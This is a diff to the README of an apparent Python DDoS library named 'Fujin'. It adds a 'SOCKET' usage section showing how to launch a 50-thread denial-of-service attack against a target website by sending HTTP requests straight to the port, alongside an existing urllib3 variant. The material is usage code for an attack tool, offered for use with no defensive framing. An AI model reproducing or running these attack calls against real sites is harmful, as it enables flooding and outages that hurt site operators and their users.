@@ -87,6 +87,13 @@ ddos = fujin(url="fuckingwebsite.com")
 ddos.thread_async_attack(threads=50, pooling_manager="urllib3")
 ```
 
+### SOCKET
+```
+# I would advise putting http:// at the start as we are directly sending HTTP Requests to the port with this one
+ddos = fujin(url="http://fuckingwebsite.com")
+ddos.thread_async_attack(threads=50, pooling_manager="socket")
+```
+
 # Example Script
 ```
 from Fujin import fujin
